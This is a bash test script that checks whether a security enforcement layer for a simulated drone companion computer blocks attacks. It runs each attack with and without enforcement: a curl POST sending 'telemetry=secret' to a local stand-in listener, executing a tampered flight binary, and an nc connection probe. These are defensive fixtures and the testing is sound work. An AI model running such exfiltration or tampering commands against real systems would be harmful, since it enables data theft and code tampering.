#!/usr/bin/env bash
# Drone companion-computer scenario for Reality Kernel.
# Each attack is run twice: once WITHOUT enforcement (must succeed, proving the
# test can actually detect something) and once WITH enforcement (must be blocked).
set -uo pipefail
cd "$(dirname "$0")/../.."
ROOT="$PWD"

FAIL=0
mkdir -p results
pass() { echo "PASS: $*"; }
fail() { echo "FAIL: $*"; FAIL=1; }

echo "== Active LSMs: $(cat /sys/kernel/security/lsm)"
grep -q bpf /sys/kernel/security/lsm || { echo "BPF-LSM not active; aborting."; exit 1; }

# ---- Start the simulated drone (flight controller) ----
SITL=ardupilot/build/sitl/bin/arducopter
SITL_ABS="$(cd "$(dirname "$SITL")" && pwd)/$(basename "$SITL")"
"$SITL" --model + --speedup 1 -I0 \
  --defaults ardupilot/Tools/autotest/default_params/copter.parm \
  > /tmp/sitl.log 2>&1 &
SITL_PID=$!
sleep 10

# A local server standing in for an UNAPPROVED server (reachable, so a block is
# meaningful). It speaks just enough HTTP to answer curl's POST; a bare `nc -lk`
# listener never responds, so curl would time out even without enforcement,
# which would make the baseline (no-RK) run fail the "must succeed" check.
python3 - > /tmp/exfil_listener.log 2>&1 <<'PY' &
import http.server
import socketserver


class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass


class Server(socketserver.TCPServer):
    allow_reuse_address = True


with Server(("127.0.0.1", 9999), Handler) as httpd:
    httpd.serve_forever()
PY
LISTENER_PID=$!

# Prepare a tampered copy of the flight binary (simulates a swapped update).
# Appending a byte after the end of the ELF sections does not stop the kernel
# from loading it (the loader only reads the ELF header and program headers),
# so this still executes under the baseline run; Reality Kernel's exec policy
# is keyed on (device, inode) identity, so the tampered copy is a different
# executable from the real one and is denied once enforced, independent of
# whether the file still "looks" runnable.
cp "$SITL" /tmp/arducopter_tampered
printf 'x' >> /tmp/arducopter_tampered
chmod +x /tmp/arducopter_tampered

# WRAP is empty for the baseline run and `rk run --profile drone --` once
# enforcement is on (set below). `timeout` stays outside WRAP so it bounds the
# whole call (including rk run's own connection overhead) without itself being
# the thing whose exec is being tested.
WRAP=()

attack_exfil() { timeout 4 "${WRAP[@]}" curl -s -m 3 http://127.0.0.1:9999/ -d "telemetry=secret"; }

attack_tamper() {
  local out rc
  out=$(timeout 4 "${WRAP[@]}" /tmp/arducopter_tampered --help 2>&1 >/dev/null)
  rc=$?
  if [ "${#WRAP[@]}" -eq 0 ]; then
    # Baseline: bash itself does the exec. 126 means bash could not exec the
    # file at all (not an RK question yet); anything else means it ran.
    [ "$rc" -ne 126 ]
  else
    # Enforced: `rk run`'s own first exec is the tampered binary, so a policy
    # denial is reported by rk itself (rk-cli/src/main.rs run_agent), not by
    # bash's exec-failure convention.
    ! grep -q '^rk run error:' <<<"$out"
  fi
}

attack_shell() { timeout 4 "${WRAP[@]}" nc -z 127.0.0.1 9999; }

run_attacks() {   # $1 = "expect-success" | "expect-blocked"
  for a in attack_exfil attack_tamper attack_shell; do
    if $a; then r=succeeded; else r=blocked; fi
    if [ "$1" = expect-success ] && [ "$r" = succeeded ]; then pass "$a reachable without enforcement"
    elif [ "$1" = expect-blocked ] && [ "$r" = blocked ]; then pass "$a blocked by Reality Kernel"
    else fail "$a $r (expected ${1#expect-})"; fi
  done
}

echo "== Baseline: no enforcement"
run_attacks expect-success
python3 scenarios/drone/bench.py baseline-no-rk results/bench-results.jsonl
timeout 60 python3 scenarios/drone/companion.py | tee -a results/companion-baseline.txt

# ---- Enable Reality Kernel ----
AUDIT_DIR=/var/log/rk/audit
STATE_FILE=/tmp/rk-engine-state.json
POLICY_FILE="$ROOT/scenarios/drone/policy.toml.rendered"
sed "s#__ARDUCOPTER_PATH__#$SITL_ABS#" "$ROOT/scenarios/drone/policy.toml" > "$POLICY_FILE"

mkdir -p /sys/fs/cgroup/rk.slice 2>/dev/null || true
rk-sensor --policy "$POLICY_FILE" --state-file "$STATE_FILE" > /tmp/rk-sensor.log 2>&1 &
RK_SENSOR_PID=$!

ready=0
for _ in $(seq 1 30); do
  if rk status >/dev/null 2>&1; then ready=1; break; fi
  sleep 1
done
if [ "$ready" -eq 1 ]; then
  pass "rk-sensor started and accepting connections"
else
  fail "rk-sensor did not come up"
  tail -n 60 /tmp/rk-sensor.log
fi
rk status || true

WRAP=(rk run --profile drone --)

echo "== Legitimate mission must still work"
if timeout 60 "${WRAP[@]}" python3 scenarios/drone/companion.py | tee -a results/companion-enforced.txt; then pass "companion mission"; else fail "companion mission"; fi
"${WRAP[@]}" python3 scenarios/drone/bench.py enforced-rk results/bench-results.jsonl

echo "== Attacks with enforcement"
run_attacks expect-blocked

echo "== Verifying Reality Kernel's signed, hash-chained audit log"
if rk audit verify --dir "$AUDIT_DIR"; then
  pass "audit chain verifies"
else
  fail "audit chain did not verify"
fi

kill "$SITL_PID" "$LISTENER_PID" "$RK_SENSOR_PID" 2>/dev/null
[ "$FAIL" -eq 0 ] && echo "ALL CHECKS PASSED" || { echo "SOME CHECKS FAILED"; exit 1; }
